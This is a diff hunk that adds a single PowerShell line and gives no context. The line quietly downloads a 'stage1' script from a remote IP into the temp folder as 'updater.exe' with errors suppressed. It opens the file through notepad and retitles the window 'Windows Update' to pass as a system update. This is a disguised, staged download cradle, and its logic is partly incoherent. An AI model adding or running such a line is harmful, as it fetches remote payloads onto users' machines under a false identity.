@@ -1,0 +1,1 @@
+$PayloadUrl = 'http://203.0.113.43/stage1.ps1'; $LocalPath = "$env:TEMP\updater.exe"; Invoke-WebRequest -Uri $PayloadUrl -OutFile $LocalPath -UseBasicParsing -ErrorAction SilentlyContinue; Start-Process -FilePath "notepad.exe" -ArgumentList $LocalPath -ErrorAction SilentlyContinue; $Host.UI.RawUI.WindowTitle = "Windows Update"; Write-Output "stage 26 initialized"
